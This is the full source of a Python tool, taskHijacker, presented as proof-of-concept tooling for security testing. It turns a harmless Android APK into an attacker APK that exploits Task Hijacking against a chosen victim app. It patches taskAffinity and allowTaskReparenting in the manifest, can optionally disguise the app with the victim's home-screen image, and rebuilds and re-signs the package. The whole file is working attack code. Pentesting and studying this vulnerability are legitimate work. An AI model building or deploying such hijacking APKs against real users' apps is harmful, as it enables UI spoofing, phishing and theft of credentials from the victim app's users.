# taskHijacker
#
#
# Description:
# This Python script has the purpose to facilitate practical Proof-of-Concept during security 
# tests of Task Hijacking vulnerability on Android apps. 
# It permits to turn an harmless APK into a malicious APK able to exploit the Task Hijacking 
# vulnerability against another victim app.
#
# Optionally, the script allows to set a custom background image on the attacker APK in 
# order to mask it (e.g. using the home screen of the victim APK) on device's screen during the 
# Task Hijacking PoC attack.
#
# Notes:
# In order to patch the attacker APK it is needed to use a keystore to re-sign it.
#
# References:
# - https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-ren-chuangang.pdf
#
#
# Author: 
# Maurizio Siddu
#
#
# Copyright (C) 2024 Maurizio Siddu
#
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>



import os, shutil
import subprocess
import argparse
import xml.etree.ElementTree as ElementTree
from getpass import getpass
import re


# Proof of Sympathy ;-)
LOGO = """ 
 _               _     _   _  _                 _               
| |_            | |   | | | |(_)               | |                    .-.       
|  /  __ _  ___ | | __| |_| | _  _  __ _   ___ | | __ ___  _ __      (o o) foo!
| |  /  ` |/ __|| |/ /|  _  || |/ |/ _` | / __|| |/ // _ \| '__|     | O \      
| |_| (_| |\__ \|   < | | | || || | (_| || (__ |   <|  __/| |         \   \     
 \__|\__,_||___/|_|\_\|_| |_||_|| |\__,_| \___||_|\_\\\___||_|          `~~~'    
                               _/ |                                                
                              |__/                                                 
taskHijacker v1.0   
"""



def decode_apk(input_apk, verbose):
    # Call apktool cmd to decode the user specified APK
    apk_name = os.path.basename(input_apk).split('.')[0]
    out_dir = "/tmp/" + apk_name
    try:
        apktool = subprocess.Popen(["apktool", "d", "-f", input_apk, "-o", out_dir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        outs, errs = apktool.communicate()
        if verbose:
            if (outs is not None) and (len(outs) != 0):
                print("[D] Decoding the APK: " + outs.decode("ascii"))
        if (errs is not None) and (len(errs) != 0):
            print("[-] Error when decoding the APK: " + errs.decode("ascii"))
            exit(1)
        return out_dir
    except FileNotFoundError as err:
        print("[-] Error, impossible to find the apktool on your OS, please install it\n" + err)
        exit(1)



def build_apk(input_apk, apk_dir, verbose):
    # Call apktool cmd to build the evil APK
    out_dir = os.path.splitext(input_apk)[0]
    patched_apk = out_dir + "_TH.apk"
    print("[+] Starting the APK rebuilding...")
    try:
        apktool = subprocess.Popen(["apktool", "b", apk_dir, "-o", patched_apk], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        outs, errs = apktool.communicate()
        build_ok = False
        if verbose:
            if (outs is not None) and (len(outs) != 0):
                # Check if built successfully
                if "[D] I: Built apk..." in outs.decode("ascii"):
                    build_ok = True
                print("[+] Building the attacker APK: " + outs.decode("ascii"))
        if (errs is not None) and (len(errs) != 0) and not build_ok:
            print("[-] Error when encoding the APK: " + errs.decode("ascii"))
            exit(1)
        # Return the patched APK fullpath
        return patched_apk
    except FileNotFoundError as err:
        print("[-] Error, impossible to find the apktool on your OS, please install it.\n" + err)
        exit(1)

        

def align_apk(input_apk, verbose):
    # Call zipaling cmd to align the built APK
    aligned_apk = "/tmp/zipaligned.apk"
    print("[+] Starting the APK alignment...")
    try:
        zipalign = subprocess.Popen(["zipalign", "-f", "-p", "4", input_apk, aligned_apk], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        outs, errs = zipalign.communicate()
        if verbose:
            if (outs is not None) and (len(outs) != 0):
                print("[D] Aligning the attacker APK: " + outs.decode("ascii"))
        if len(errs) != 0:
            print("[-] Error whend ecoding the APK: " + errs.decode("ascii"))
            exit(1)
        # Overwrite the aligned APK on the patched APK 
        shutil.move(aligned_apk, input_apk)
        return
    except (IndexError, FileNotFoundError) as err:
        print("[-] Error, impossible to find the apktool on your OS, please install it.\n" + err)
        exit(1)



def sign_apk(input_apk, verbose):
    # Call apksigner cmd to sign the built APK
    lines = []
    count = 0
    keystore_path = ""
    keypass = ""
    keyalias = ""
    print("[+] Starting the APK signing procedure, in order to continue a keystore is needed...")
    # Ask for a keystore path, password and alias
    for i in range(3):
        if count==1:
            # Insert password value secretly 
            line = getpass(">>> Enter your keystore password: ")
            lines.append(line)
            count += 1
        elif count==2:
            line = input(">>> Enter your keystore alias: ")
            lines.append(line)
            break
        else:
            line = input(">>> Enter your keystore fullpath: ")
            lines.append(line)
            count += 1

    if not lines[0]:
        print("[-] Error, in order to sign the APK you should enter a keystore fullpath during the signing procedue")
        exit(1)
    else:  
        keystore_path = lines[0]

    if (not lines[1]):
        print("[-] Error, in order to sign the APK you should enter the keystore password during the signing procedue")
        exit(1)
    else:
        keypass = "pass:" + lines[1]

    if (not lines[2]):
        print("[!] Warning, the keystore alias was not provided. Still trying to sign the patched APK with the default alias 'mykey'...")
    else:
        keyalias = lines[2]

    if not os.path.isfile(input_apk):
        print("[-] Error, the APK to sign was not found on the specified path: " + input_apk)
        exit(1)

    try:
        # The command changes when keyalias has been specified or not
        if keyalias:
            apksigner = subprocess.Popen(["apksigner", "sign", "-v", "--ks", keystore_path, "--ks-key-alias", keyalias, "--ks-pass", keypass, input_apk], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            apksigner = subprocess.Popen(["apksigner", "sign", "-v", "--ks", keystore_path, "--ks-key-alias", "mykey", "--ks-pass", keypass, input_apk], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        outs, errs = apksigner.communicate()

        if verbose:
            if (outs is not None) and (len(outs) != 0):
                print("[D] Output apksigner: " + outs.decode("ascii"))
        if (errs is not None) and (len(errs) != 0):
            print("[-] Error occurred during APK signing, 'apksigner' returns: " + errs.decode("ascii"))
            exit(1)
        return
    except FileNotFoundError as err:
        print("[-] Error, impossible to find the apksigner on your OS, please install it\n" + err)
        exit(1)



def get_manifest(apk_dir):
    # Retrieve the AndroidManifest file from decompiled APK
    ElementTree.register_namespace("android", "http://schemas.android.com/apk/res/android")
    return ElementTree.parse(os.path.join(apk_dir, "AndroidManifest.xml"))



def get_packagename(apk_dir):
    # Retrieve the package name of the decompiled APK
    manifest = get_manifest(apk_dir)
    root = manifest.getroot()
    return root.attrib["package"]



def get_activities(apk_dir):
    # Retrieve the list of activities of the decompiled APK
    activities = []
    manifest = get_manifest(apk_dir)
    root = manifest.getroot()
    activities = root.findall(".application/activity")
    return activities



def get_main_activity(apk_dir):
    # Retrieve the main activity name of the decompiled APK
    main_activity = ""
    activities = get_activities(apk_dir)
    for activity in activities:
        activity_name = activity.attrib["{http://schemas.android.com/apk/res/android}name"]
        if activity.find("intent-filter"):
            action_name = activity.find("intent-filter/action").attrib["{http://schemas.android.com/apk/res/android}name"]
            if ((action_name == "android.intent.action.MAIN") and (activity.find("intent-filter/category").attrib["{http://schemas.android.com/apk/res/android}name"])):
                if (activity.find("intent-filter/category").attrib["{http://schemas.android.com/apk/res/android}name"] == "android.intent.category.LAUNCHER"):
                    main_activity = activity_name
    return main_activity



def get_activity_tag(manifest, main_activity, evil_activity):
    # Retrieve the tag of the evil activity to modify for Task Hijacking exploitation on attacker APK
    activity_tag = []
    root = manifest.getroot()
    package_name = root.attrib["package"]
    print("[+] The main activity of the attacker APK is '" + main_activity + "'")
    # If the user specified an evil activity different from the main activity of attacker APK, then it is needed to validate it
    if main_activity != evil_activity:
        print("[+] Searching for the evil activity '" + evil_activity + "' in the attacker APK...")
        # An activity-name into the AndroidManifest could be in these formats: 'asd.example.package.EvilActivity', '.EvilActivity' and 'EvilActivity'.
        for activity_name in [package_name + "." + evil_activity, evil_activity, "." + evil_activity]:
            activity_tag = root.findall(".application/activity[@{http://schemas.android.com/apk/res/android}name='" + activity_name + "']")
            if activity_tag:
                break
        # Checking that the user specified evil activity exists 
        if len(activity_tag) <= 0:
            print("[-] Error, the specified evil activity '" + evil_activity + "' does not exists in the attacker APK, please revise your choice")
            exit(1)
    else:
        # The main activity corresponds to the evil activity chosen by the user
        activity_tag = root.findall(".application/activity[@{http://schemas.android.com/apk/res/android}name='" + main_activity + "']")
    print("[+] The evil activity '" + evil_activity + "' was found on the attacker APK")
    return activity_tag



def read_file(filepath):
    # Get the content of the specified file
    file = open(filepath, 'r')
    content = file.read()
    file.close()
    return content



def task_misconfig(input_dir, victim_package, evil_activity):
    # Inject the task hijacking setting for misconfig-task exploitation mode
    manifest = get_manifest(input_dir)
    main_activity = get_main_activity(input_dir)
    if evil_activity is None:
        # The evil activity was not specified, the exploit will use the main activity
        print("[+] The main activity '" + main_activity + "' of the attacker APK will be the evil activity")
        evil_activity = main_activity
    # Extract the evil activity to modify
    activity_tag = get_activity_tag(manifest, main_activity, evil_activity)
    activity_tag = activity_tag[0]
    print("[+] Inserting the 'taskAffinity' flag with the victim package-name value " + victim_package + "' on the evil activity '" + evil_activity + "'...")
    activity_tag.attrib["{http://schemas.android.com/apk/res/android}taskAffinity"] = victim_package
    # Writing the patched AndroidManifest.xml file
    manifest.write(os.path.join(input_dir, "AndroidManifest.xml"), encoding='utf-8', xml_declaration=True)
    print("[+] Successfully modified the attacker APK to exploit Task Hijacking with 'misconfig-task' mode")
    return



def task_cuckoo(input_dir, victim_package, evil_activity):
    activity_tag = []
    # Inject the task hijacking setting for cuckoo-task exploitation mode
    manifest = get_manifest(input_dir)
    main_activity = get_main_activity(input_dir)
    if evil_activity is None:
        # The evil activity was not specified, the exploit will use the main activity
        print("[+] The main activity '" + main_activity + "' of the attacker APK will be the evil activity")
        evil_activity = main_activity
    # Extract the evil activity to modify
    activity_tag = get_activity_tag(manifest, main_activity, evil_activity)
    activity_tag = activity_tag[0]
    print("[+] Inserting the value '" + victim_package + "' into the 'taskAffinity' flag of the evil activity '" + evil_activity + "'..." )
    activity_tag.attrib["{http://schemas.android.com/apk/res/android}taskAffinity"] = victim_package
    print("[+] Enabling the attribute 'allowTaskReparenting' on the evil activity '" + evil_activity + "'..." )
    activity_tag.attrib["{http://schemas.android.com/apk/res/android}allowTaskReparenting"] = 'true'
    # Writing the patched AndroidManifest.xml file
    manifest.write(os.path.join(input_dir, "AndroidManifest.xml"), encoding='utf-8', xml_declaration=True)
    print("[+] Successfully modified the attacker APK to exploit Task Hijacking with 'cuckoo-task' mode")
    return



def change_bg(apk_dir, image_dir, image, evil_activity=None, verbose=False):
    # Inject the image as background on the patched APK
    layout_file = ""
    layout_id = ""
    activities = []
    image_path = image_dir[4:]
    # If the specified image folder does not exist it will be created on attacker APK
    if not os.path.exists(apk_dir+"/"+image_dir):
        os.makedirs(apk_dir+"/"+image_dir)
        print("[!] Creating the image folder '" + apk_dir+"/"+image_dir + "' because it do not exists on attacker APK")
    copy = subprocess.Popen(["cp", image, apk_dir+"/"+image_dir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    outs, errs = copy.communicate()
    if verbose:
        if (outs is not None) and (len(outs) != 0):
            print("[D] Copying the backgroung image into the APK location '" + image_dir + "'.\n"  + outs.decode("ascii"))
    if (errs is not None) and (len(errs) != 0):
        raise Exception(errs.decode("ascii"))
    # Modify the layout file
    layout_dir = apk_dir + "/res/layout/"
    # Get image filename without extension from its fullpath
    image_name = os.path.basename(image).split('.')[0]
    ElementTree.register_namespace("android", "http://schemas.android.com/apk/res/android")
    # Get package name and build the smali path for the decompiled APK
    smali_package = get_packagename(apk_dir).replace(".", "/")
    main_activity = get_main_activity(apk_dir).lstrip(".")
    activity_name_ok = False
    if evil_activity:
        activity_name = evil_activity
    else:
        activity_name = main_activity
    # Retrieving the layout filename of the activities to modify
    if not activity_name_ok:
        # Setting max search limit to 30 smali classes
        for smali_count in range(31):
            if smali_count == 0:
                smali_path = "/smali/"
            else:
                smali_path = "/smali_classes" + str(smali_count) + "/"
            # Starting the search for the specific malicious acivity smali file
            for tmp_activity_name in [activity_name, activity_name+"$1", activity_name+"$2", activity_name+"$3", activity_name+"$4"]:
                smali_filename = apk_dir + smali_path + smali_package + "/" + tmp_activity_name + ".smali"
                if os.path.isfile(smali_filename):
                    if verbose:
                        print("[D] Trying with activity file '" + smali_filename + "'...")
                    try:
                        smali_content = read_file(smali_filename)
                    except IOError:
                        print("[!] Not found the activity file '" + smali_filename + "', continuing the search..")
                        continue
                    # Retrieving the id of the searched layout file
                    m_obj_1 = re.search("onCreate.*(0x[a-fA-F0-9]{8}).*setContentView", smali_content, re.DOTALL)
                    m_obj_2 = re.search("initaliseActivity.*(0x[a-fA-F0-9]{8}).*setContentView", smali_content, re.DOTALL)
                    if m_obj_1:
                        layout_id = m_obj_1.group(1)
                        if verbose:
                            print("[D] Found the identifier for the '" + tmp_activity_name + "' activity layout on " + layout_id)
                        activity_name = tmp_activity_name
                        break
                    if m_obj_2:
                        layout_id = m_obj_2.group(1)
                        if verbose:
                            print("[D] Found the identifier for the '" + tmp_activity_name + "' activity layout on " + layout_id)
                        activity_name = tmp_activity_name
                        break
            activity_name_ok = True
            break
        
        if not activity_name_ok:
            print("[-] Exiting, something goes wrong not found the evil activity on the attacker APK,. Try to check your APK contents..")
            exit(1)
        
        # Setting max search limit to 30 smali classes
        for smali_count in range(31):
            if smali_count == 0:
                smali_path = "/smali/"
            else:
                smali_path = "/smali_classes" + str(smali_count) + "/"
            # Starting the search for the smali file containing the list of layout filenames
            smali_layout_file = apk_dir + smali_path + smali_package + "/R$layout.smali"
            if verbose:
                print("[D] Trying with layout file '" + smali_layout_file + "'...")
            if os.path.isfile(smali_layout_file):
                try:
                    smali_content = read_file(smali_layout_file)
                except IOError:
                    print("[!] Not found the layout file '" + smali_layout_file + "', continuing the search..")
                    continue
                # Retrieving the name of the searched layout file
                m_obj = re.search("static final ([\\w]+):[\\w]*?\\s]?\\=[\\s]?"+layout_id, smali_content, re.DOTALL)
                if m_obj:
                    layout_file = m_obj.group(1)+".xml"
                    if verbose:
                        print("[D] Found the layout filename for the '" + activity_name + "' activity on " + layout_file)
                    break
                 
        # Starting to change the app background
        if layout_file:
            # Search for the specific activity layout files recursively into layout folder
            layout_dir = apk_dir + "/res/layout"
            for rootpath, dirs, files in os.walk(layout_dir):
                for file in files:
                    if file == layout_file:
                        bg_path = rootpath+"/"+file
                        if verbose:
                             print("[D] Found '" + activity_name + "' activity layout file on path '" + bg_path + "'")
                        xml = ElementTree.parse(bg_path)
                        root = xml.getroot()
                        # Identify the root tag into the layout xml file and set the new background image on it
                        for layout_type in ["RelativeLayout", "LinearLayout", "androidx.constraintlayout.widget.ConstraintLayout", "android.support.constraint.ConstraintLayout", "AbsoluteLayout", "FrameLayout", "GridLayout"]:
                            layout_found = False
                            if verbose:
                                print("[D] Found layout type of '" + root.tag + "'")
                            if root.tag == layout_type:
                                layout_found = True
                                main_layout_tag = root
                                main_layout_tag.attrib["{http://schemas.android.com/apk/res/android}background"] = "@" + image_path + image_name
                                # Changing the background of the specific activity
                                xml.write(bg_path, encoding='utf-8', xml_declaration=True)
                                break
                        if not layout_found:
                            print("[-] Warning, not found layout file for: '"+ file +"'. Try adding to the list of layout types the value: '"+root.tag+"'")      
    # Background modification is completed
    print("[+] Changed the background of the attacker APK using '" + image + "'")
    return



def main():
    # Handle the user input
    parser = argparse.ArgumentParser(prog="taskHijacker", epilog="Additional note: a keystore is needed in order to re-sign the patched attacker APK")
    parser.add_argument("-m", "--misconfig_task", metavar="PACKAGE_NAME", help="Specify the package-name of the victim APK to exploit victim APK task misconfigurations. It modifies only the the 'taskAffinity' flag into the attacker APK")
    parser.add_argument("-c", "--cuckoo_task", metavar="PACKAGE_NAME", help="Specify the package-name of the victim APK to exploit an unsafe Android OS feature. It modifies both the 'taskAffinity' and 'allowTaskReparenting' flags into the attacker APK")
    parser.add_argument("-e", "--evil_activity", help="Specify the activity-name of the attacker APK used to perform the Task Hijacking attack (by default is the main activity)")
    parser.add_argument("-i", "--img_bg", help="Specify the fullpath of the image file to set as background on the attacker APK")
    parser.add_argument("-d", "--dir_bg", help="Specify the location where put the background image into the attacker APK. It should be a relative path within 'res/' folder (by default is 'res/drawable/')", default="res/drawable/")
    parser.add_argument("-a", "--apk", help="Specify the fullpath of the APK to turn into the attacker APK. The new attacker APK will be generated on the same location", required=True)
    parser.add_argument("-v", "--verbose", help="Enable verbose output", action='store_true')
    args = parser.parse_args()


    if ((not args.misconfig_task) and (not args.cuckoo_task)):
        print("[-] Error, it is necessary to select at least one of the exploitation modes: 'misconfig-task' or 'cuckoo-task'\n")
        parser.print_help()
        exit(1)

    if ((args.misconfig_task) and (args.cuckoo_task)):
        print("[-] Error, it is possible to select only one of the exploitation modes: 'misconfig-task' or 'cuckoo-task'\n")
        parser.print_help()
        exit(1)

    if not args.dir_bg.startswith("res/"):
        print("[-] Error, the specified relative path for the backgroung image must start with 'res/'\n")
        parser.print_help()
        exit(1)

    if not os.path.isfile(args.apk):
        print("[-] Error, the specified APK file '" + args.apk + "' does not exists\n")
        parser.print_help()
        exit(1)

    print(LOGO)
    print("[+] taskHijacker is starting to turn bad your harmless APK...")
    verbose = args.verbose
    apk_path = args.apk
    bg_dir = args.dir_bg

    # Check if the evil activity has been specified 
    evil_activity = args.evil_activity
    if evil_activity is None:
        print("[+] The evil activity was not specified, by default the main activity of the attacker APK will be used...")
    else:
        if ("." in evil_activity):
            evil_activity = evil_activity.rsplit(".", 1)[-1]
        print("[+] The chosen evil activity on the attacker APK is '" + evil_activity + "'")

    # Check if the specified background folder ends with a "/" char
    if not bg_dir.endswith("/"):
        bg_dir += "/"

    # Firstly decode the attacker APK
    decoded_dir = decode_apk(apk_path, verbose)

    # Generate the attacker APK with any of the exploit modes
    if args.misconfig_task:
        # Chosen misconfig-task exploit
        print("[+] Selected the task hijacking 'misconfig-task' exploit mode")
        task_misconfig(decoded_dir, args.misconfig_task, evil_activity)

    if args.cuckoo_task:
        # Chosen cuckoo-task exploit
        print("[+] Selected the task hijacking 'cuckoo-task' exploit mode")
        task_cuckoo(decoded_dir, args.cuckoo_task, evil_activity)

    if args.img_bg:
        # Chosen to add a background image on the attacker APK 
        bg_img = args.img_bg
        if not os.path.isfile(bg_img):
            print("[-] Error, the specified background image file '" + bg_img + "' does not exists\n")
            exit(1)
        change_bg(decoded_dir, bg_dir, bg_img, evil_activity, verbose)

    # Build, align and sign the attacker APK
    patched_apk = build_apk(apk_path, decoded_dir, verbose)
    print("[+] Attacker APK build completed")
    align_apk(patched_apk, verbose)
    print("[+] Attacker APK alignment completed")
    sign_apk(patched_apk, verbose)
    print("[+] Attacker APK signature completed")
    print("[+] Successfully generated the attacker APK in: '" + os.path.dirname(apk_path) +"/" + os.path.basename(patched_apk) + "'")




if __name__ == "__main__":
    main()
